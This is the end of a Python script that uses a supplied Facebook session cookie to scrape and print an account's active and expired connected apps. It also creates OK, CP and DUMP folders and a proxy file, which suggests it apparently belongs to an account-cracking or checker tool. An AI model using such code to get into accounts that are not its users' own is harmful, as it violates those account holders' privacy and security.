	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text

	sop = bs4.BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	try:

		for i in range(len(game)):

			print ("\r%s  \033[0m              ➥ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))

	except AttributeError:

		print ("\r    %s\033[0m cookie invalid"%(M))

	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text

	sop = bs4.BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	try:

		for i in range(len(game)):

			print ("\r%s  \033[0m              ➥ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))

	except AttributeError:

		print ("\r    %s \033[0mcookie invalid"%(M))



if __name__=='__main__':

	try:os.mkdir('OK')

	except:pass

	try:os.mkdir('CP')

	except:pass

	try:os.mkdir('DUMP')

	except:pass

	try:os.system('touch .prox.txt')

	except:pass

	menu()